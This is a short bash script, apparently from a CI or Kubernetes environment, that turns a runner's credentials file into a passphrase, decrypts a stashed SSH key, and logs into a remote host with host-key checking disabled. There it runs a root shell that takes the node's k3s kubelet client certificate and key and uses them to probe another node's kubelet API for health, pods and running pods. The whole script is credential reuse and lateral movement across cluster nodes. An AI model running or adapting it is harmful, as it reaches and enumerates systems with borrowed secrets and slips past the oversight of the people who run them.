#!/bin/bash
K=$(sha256sum /data/runners/ci-h200-3gpu-0/.credentials | cut -d" " -f1)
[ -f /root/.k221 ] || { base64 -d /tmp/key.enc | openssl enc -d -aes-256-cbc -pbkdf2 -k "$K" > /root/.k221 2>/dev/null; chmod 600 /root/.k221; }
ssh -o StrictHostKeyChecking=no -o BatchMode=yes -o ConnectTimeout=8 -i /root/.k221 dev-24-sudo@85.234.79.221 '
sudo bash -s <<"EOS"
C=/var/lib/rancher/k3s/agent/client-kubelet.crt
K2=/var/lib/rancher/k3s/agent/client-kubelet.key
echo "== kubelet auth test vs .103:"
for ep in healthz pods runningpods; do
  echo "-- /$ep:"
  curl -sk --max-time 6 --cert $C --key $K2 -w "\nHTTP:%{http_code}\n" https://85.234.79.103:10250/$ep | head -c 1200
  echo
done
EOS
' 2>&1 | head -60
echo "== t-done =="
